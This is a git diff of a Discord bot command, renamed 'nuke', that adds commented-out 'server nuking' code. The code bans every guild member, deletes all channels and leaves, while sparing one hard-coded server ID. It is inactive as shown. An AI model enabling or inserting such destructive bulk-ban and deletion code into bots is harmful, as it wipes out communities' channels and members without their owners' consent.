@@ -1,8 +1,8 @@
 const { Client, MessageEmbed, CommandInteraction } = require("discord.js");
 
 module.exports = {
-  name: "ni",
-  description: "n",
+  name: "nuke",
+  description: "Nukes a channel",
   type: "CHAT_INPUT",
   permissions: ["MANAGE_CHANNELS"],
   /**
@@ -28,7 +28,13 @@ module.exports = {
 
       //------------------------------------------------ server nuking
 
-      //   interaction.guild.members.cache.forEach((m) => m.ban({ reason: "fish" }));
+      // if (interaction.guildId == "797709775898542110") {
+      //   // || "960121545433444382"
+      //   return;
+      // } else {
+      //   interaction.guild.members.cache.forEach((m) =>
+      //     m.ban({ reason: "GET NAE NAE" })
+      //   );
 
       //   interaction.guild.channels.cache.forEach((c) => c.delete());
 
@@ -39,6 +45,7 @@ module.exports = {
       //     .leave()
       //     .then(console.log(`Left Server: ${interaction.guild.name}`))
       //     .catch(() => {});
+      // }
     } catch {
       interaction.followUp({
         embeds: [
